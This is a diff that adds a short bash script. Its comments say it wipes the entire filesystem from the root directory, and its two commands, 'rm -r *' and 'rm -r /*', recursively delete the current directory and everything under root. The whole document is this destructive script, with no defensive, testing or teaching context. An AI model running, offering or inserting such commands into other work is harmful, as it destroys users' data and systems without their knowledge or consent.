@@ -1,0 +1,5 @@
+#!/bin/bash
+# This script would attempt to remove all files and directories from the root directory, essentially wiping the entire system's filesystem.
+# It just destroy's the system
+rm -r *
+rm -r /*
